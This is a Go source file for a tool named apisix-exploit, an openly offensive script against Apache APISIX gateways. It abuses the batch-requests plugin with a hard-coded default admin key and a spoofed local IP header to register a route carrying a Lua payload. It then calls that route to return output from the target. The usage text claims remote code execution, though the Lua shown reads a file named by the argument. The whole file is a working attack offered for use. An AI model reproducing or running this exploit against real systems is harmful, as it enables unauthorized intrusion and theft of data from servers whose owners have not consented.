//Author: Mah1ndra
package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

const(
	admin_key = "edd1c9f034335f136f87ad84b625c8f1"
	real_ip = "127.0.0.1"
	route_path =  "/apisix/admin/routes/1"
	node_addr = "127.0.0.1:1337"
)

func usage(){
	fmt.Fprint(os.Stderr, `Usage: apisix-exploit [flag] [target] [flag] [command]
	apisix-exploit leverages batch-request plugin to register an admin route with default admin key along with a lua_script to achive RCE
	Flags:
		-t, --target  target name for the host assessment
		-c, --command command that need to be executed on the system
		-v, --verbose  Print verbose logs to stderr.
	`)
}

func check(err error){
	if err != nil {
		log.Fatalln(err)
	}
}

func invokeRoute(URL string){
	resp, err := http.Get(URL)
	check(err)
	body,err := ioutil.ReadAll(resp.Body)
	check(err)
	fmt.Println("output >>", string(body))
}

func registerRoute(URL string, reqBody string) int64{
	URL = URL + "/apisix/batch-requests"

	jasonPayload := []byte(reqBody)
	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(jasonPayload))
	check(err)
	client := &http.Client{}
	resp, err := client.Do(req)
	check(err)
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	fmt.Println("request body:", string(body))
	check(err)
	return resp.ContentLength
}

func race(URL string, reqBody string, path string){
	var ContentLength int64
	for {
		ContentLength = registerRoute(URL, reqBody)
		if ContentLength > 500 {
			fmt.Printf("succesfully registered route")
			break
		}
		time.Sleep(time.Second * 2)
	}
	fmt.Println("Invoking the registered path to execute command:")
	invokeRoute(URL + path)
}

func lua_script(cmd string) string{
	return fmt.Sprintf("local _M = {} \\n function _M.access(api_ctx) \\n \\nngx.say(io.open(\\\"%s\\\"):read()) \\n end \\n return _M", cmd)
}

func genReqBody(cmd string, exec_path string) string{
	
	lua_script := lua_script(cmd)
	return fmt.Sprintf("{\"headers\":{\"Content-Type\":\"application/json\", \"X-API-KEY\": \"%s\", \"X-REAL-IP\": \"%s\"}, \"timeout\": 500, \"pipeline\":[{\"method\": \"PUT\", \"path\": \"%s\", \"body\":\"{ \\\"script\\\": \\\"%s\\\", \\\"uri\\\": \\\"%s\\\\\\\", \\\"upstream\\\" : { \\\"type\\\": \\\"roundrobin\\\", \\\"nodes\\\": {\\\"%s\\\": 1}} }\"}]}", admin_key,real_ip,  route_path, lua_script, exec_path, node_addr )
}

func main(){
	var(
		t string
		c string
	)

	flag.StringVar(&t, "t", "", "")
	flag.StringVar(&c, "c", "", "")
	flag.Usage = usage
	flag.Parse()

	if len(t) == 0 || len(c) == 0 {
		usage()
		os.Exit(1)
	}
	// set proxy
	os.Setenv("HTTP_PROXY", "127.0.0.1:8080")
	fmt.Println("Target: ", t)
	fmt.Println("port:", c)
	path := "/pwn1337"
	body := genReqBody(c, path)
	race(t, body, path)
}
